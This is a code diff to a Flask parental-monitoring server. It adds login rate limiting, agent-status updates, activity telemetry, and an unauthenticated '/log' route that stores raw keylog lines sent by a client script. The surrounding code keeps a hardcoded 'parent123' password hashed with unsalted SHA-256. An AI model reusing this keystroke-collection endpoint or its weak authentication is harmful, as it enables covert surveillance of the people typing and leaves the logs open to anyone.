@@ -4,7 +4,7 @@ from flask_cors import CORS
 from flask_socketio import SocketIO, emit
 from datetime import datetime, timedelta
 from functools import wraps
-import os, logging, hashlib, json
+import os, logging, hashlib, json, time
 
 # --- App Setup ---
 app = Flask(__name__)
@@ -31,6 +31,9 @@ db = SQLAlchemy(app)
 # Default parent password (sha256 hash of "parent123")
 DEFAULT_PASSWORD_HASH = hashlib.sha256("parent123".encode()).hexdigest()
 
+# Login rate limiting: max 5 attempts per minute per IP
+_login_attempts = {}  # {ip: [timestamps]}
+
 # --- Database Models ---
 
 class AppCategory(db.Model):
@@ -54,7 +57,7 @@ class ScreenTimeRule(db.Model):
     blocked_apps = db.Column(db.String(500), default="[]")  # JSON list, changed type to String(500)
     filter_intensity = db.Column(db.Integer, default=5) # New field
     is_active = db.Column(db.Boolean, default=True)
-    updated_at = db.Column(db.DateTime, default=datetime.utcnow)
+    updated_at = db.Column(db.DateTime, default=datetime.now)
 
 class ThreatLog(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -85,7 +88,10 @@ def handle_connect():
 
 @socketio.on('disconnect')
 def handle_disconnect():
+    global agent_connected
+    agent_connected = False
     logger.info(f"Client disconnected: {request.sid}")
+    emit('agent_status', {'connected': False}, broadcast=True)
 
 @socketio.on('agent_hello')
 def handle_agent_hello(data):
@@ -195,16 +201,27 @@ def login_page():
 
 @app.route("/api/login", methods=["POST"])
 def api_login():
+    ip = request.remote_addr
+    now = time.time()
+    attempts = _login_attempts.get(ip, [])
+    # Keep only attempts in the last 60 seconds
+    attempts = [t for t in attempts if now - t < 60]
+    if len(attempts) >= 5:
+        logger.warning(f"Rate limit exceeded for IP {ip}")
+        return jsonify({"status": "error", "message": "Too many attempts. Try again later."}), 429
+    _login_attempts[ip] = attempts
+
     data = request.get_json() or {}
     password = data.get('password', '')
     pw_hash = hashlib.sha256(password.encode()).hexdigest()
-    
+
     if pw_hash == DEFAULT_PASSWORD_HASH:
         session['logged_in'] = True
         session['login_time'] = datetime.now().isoformat()
         logger.info("Parent logged in successfully.")
         return jsonify({"status": "ok"})
-    
+
+    _login_attempts[ip].append(now)
     logger.warning("Failed login attempt.")
     return jsonify({"status": "error", "message": "Invalid password"}), 401
 
@@ -218,8 +235,8 @@ def api_logout():
 @app.route("/api/analytics/daily", methods=["GET"])
 @login_required
 def get_daily_analytics():
-    logs = ActivityLog.query.order_by(ActivityLog.timestamp.desc()).limit(100).all()
-    # The diff provided a new structure for the return value.
+    today_start = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
+    logs = ActivityLog.query.filter(ActivityLog.timestamp >= today_start).order_by(ActivityLog.timestamp.desc()).limit(100).all()
     logs_data = [{
         "timestamp": log.timestamp.isoformat(),
         "app_name": log.app_name,
@@ -340,6 +357,45 @@ def get_status():
         "max_daily_minutes": rule.max_daily_minutes if rule else 120,
         "limit_active": rule.is_active if rule else False
     })
+
+@app.route("/log", methods=["POST"])
+def receive_log():
+    """Receive raw keylog lines from send_logs.py."""
+    data = request.get_json() or {}
+    logs = data.get("logs", [])
+    if logs:
+        try:
+            with open(os.path.join(basedir, "received_logs.txt"), "a", encoding="utf-8") as f:
+                for line in logs:
+                    f.write(line + "\n")
+            logger.info(f"Received {len(logs)} keylog lines.")
+        except Exception as e:
+            logger.error(f"Error writing keylog: {e}")
+            return jsonify({"status": "error"}), 500
+    return jsonify({"status": "ok", "received": len(logs)})
+
+@app.route("/api/telemetry", methods=["POST"])
+@login_required
+def receive_telemetry():
+    """Receive activity telemetry from activity_monitor.py (HTTP fallback)."""
+    data = request.get_json() or {}
+    activities = data.get("activities", [])
+    try:
+        for act in activities:
+            log = ActivityLog(
+                timestamp=datetime.now(),
+                app_name=act.get("app_name", "Unknown"),
+                window_title=act.get("window_title", ""),
+                category=act.get("category", "Neutral"),
+                duration=int(act.get("duration", 0))
+            )
+            db.session.add(log)
+        db.session.commit()
+        return jsonify({"status": "ok", "saved": len(activities)})
+    except Exception as e:
+        db.session.rollback()
+        logger.error(f"Error saving telemetry: {e}")
+        return jsonify({"status": "error"}), 500
 
 # --- Frontend Routes ---
 
